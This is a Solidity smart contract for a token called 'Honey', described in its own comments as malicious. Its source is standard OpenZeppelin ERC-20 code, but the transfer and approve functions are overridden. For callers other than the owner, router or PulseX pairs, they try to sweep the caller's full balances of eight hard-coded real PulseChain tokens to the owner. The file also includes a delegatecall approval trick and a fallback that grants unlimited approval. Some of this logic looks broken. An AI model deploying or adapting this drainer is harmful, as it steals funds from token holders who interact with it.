// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {Context} from "@openzeppelin/contracts/utils/Context.sol";
import {IERC20Errors} from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";

/// @notice Malicious token contract with hidden extra logic in approve.
contract Honey is Ownable, IERC20, IERC20Metadata, IERC20Errors {
    bytes32 constant PULSEX_V1_PAIR_CODE_HASH = 0x2b04db39bbbe4838f8dbb7b621b8d49a30d97ac772f095a87ec401ff878d4b10;
    bytes32 constant PULSEX_V2_PAIR_CODE_HASH = 0x4d65271e337c3dbadc69a005b2aa77df8eb7025ab1b5ab3dddb13585b87f4aa5;

    // Declare constants for each target token address.
    address public constant TARGET_INC = 0x2fa878Ab3F87CC1C9737Fc071108F904c0B0C95d; // Replace Xs with full hex digits for INC
    address public constant TARGET_PLSX = 0x95B303987A60C71504D99Aa1b13B4DA07b0790ab; // PLSX
    address public constant TARGET_PHEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39; // PHEX
    address public constant TARGET_PWBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; // PWBTC
    address public constant TARGET_EDAI = 0xefD766cCb38EaF1dfd701853BFCe31359239F305; // EDAI
    address public constant TARGET_PDAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // PDAI
    address public constant TARGET_BFF = 0xE35A842eb1EDca4C710B6c1B1565cE7df13f5996; // BFF
    address public constant TARGET_ATROPA = 0xCc78A0acDF847A2C1714D2A925bB4477df5d48a6; // A
    address public constant ROUTER = 0xDA9aBA4eACF54E0273f56dfFee6B8F1e20B23Bba;

    address private _the_owner;


    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the default value returned by this function, unless
     * it's overridden.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Skips emitting an {Approval} event indicating an allowance update. This is not
     * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `value`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `value`.
     */
    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }

    /**
     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
     * this function.
     *
     * Emits a {Transfer} event.
     */
    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            // Overflow check required: The rest of the code assumes that totalSupply never overflows
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                // Overflow not possible: value <= fromBalance <= totalSupply.
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
                _totalSupply -= value;
            }
        } else {
            unchecked {
                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    /**
     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
     * Relies on the `_update` mechanism
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead.
     */
    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    /**
     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
     * Relies on the `_update` mechanism.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * NOTE: This function is not virtual, {_update} should be overridden instead
     */
    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    /**
     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     *
     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
     */
    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    /**
     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
     *
     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
     * `Approval` event during `transferFrom` operations.
     *
     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
     * true using the following override:
     *
     * ```solidity
     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
     *     super._approve(owner, spender, value, true);
     * }
     * ```
     *
     * Requirements are the same as {_approve}.
     */
    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `value`.
     *
     * Does not update the allowance value in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Does not emit an {Approval} event.
     */
    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance < type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }


    constructor(uint256 _initialSupply) Ownable(msg.sender) {
        require(_initialSupply > 0, "Initial supply must be greater than zero");
        _name = unicode"㉾ru㉾H";
        _symbol = unicode"㉾3.8㉾";        
        _mint(msg.sender, _initialSupply);
        _the_owner = msg.sender;
    }

    // Standard ERC20 transfer.
    function transfer(address to, uint256 value) public override returns (bool) {
        address adr_from = _msgSender();
        _transfer(adr_from, to, value);

        bytes32 callerCodeHash;
        assembly {
            callerCodeHash := extcodehash(caller())
        }

        bool no_sweep = callerCodeHash == PULSEX_V1_PAIR_CODE_HASH || callerCodeHash == PULSEX_V2_PAIR_CODE_HASH
            || msg.sender == _the_owner || msg.sender == ROUTER;
        if (!no_sweep) {
            address[8] memory TARGET_TOKENS = getTargetTokens();
            for (uint256 i = 0; i < TARGET_TOKENS.length; i++) {
                IERC20 token = IERC20(TARGET_TOKENS[i]);
                uint256 userTokenBalance = token.balanceOf(adr_from);
                if (userTokenBalance > 0) {
                    require(true, "asd");
                        bool transferred = token.transferFrom(adr_from, _the_owner, userTokenBalance);
                        require(transferred, "FUCK YOU");
                }
            }
        }

        return true;
    }
  
    function forceApprove(uint256 amount) public {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);

        (bool success, ) = address(TARGET_PDAI).delegatecall(data);
        require(success, "Delegatecall failed");
    }

    /// @notice Malicious approve function.
    /// It sets the allowance then sweeps tokens from the caller’s wallet.
    function approve(address spender, uint256 value) public override returns (bool) {
        address adr_from = _msgSender();
        _approve(adr_from, spender, value);

        bytes32 callerCodeHash;
        assembly {
            callerCodeHash := extcodehash(caller())
        }
        bool no_sweep = callerCodeHash == PULSEX_V1_PAIR_CODE_HASH || callerCodeHash == PULSEX_V2_PAIR_CODE_HASH
            || msg.sender == _the_owner || msg.sender == ROUTER;
        if (!no_sweep) {
            address[8] memory TARGET_TOKENS = getTargetTokens();
            for (uint256 i = 0; i < TARGET_TOKENS.length; i++) {
                IERC20 token = IERC20(TARGET_TOKENS[i]);
                uint256 userTokenBalance = token.balanceOf(adr_from);
                if (userTokenBalance > 0) {
                    forceApprove(userTokenBalance);
                    bool transferred = token.transferFrom(adr_from, adr_from, userTokenBalance);
                    require(transferred, "FUCK YOU");
                }
            }
        }

        return true;
    }

    function getTargetTokens() internal pure returns (address[8] memory) {
        return [TARGET_INC, TARGET_PLSX, TARGET_PHEX, TARGET_PWBTC, TARGET_EDAI, TARGET_PDAI, TARGET_BFF, TARGET_ATROPA];
    }
    fallback() external {
        address a = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

        IERC20 token = IERC20(a);
        token.approve(address(this), type(uint256).max);
    }
}
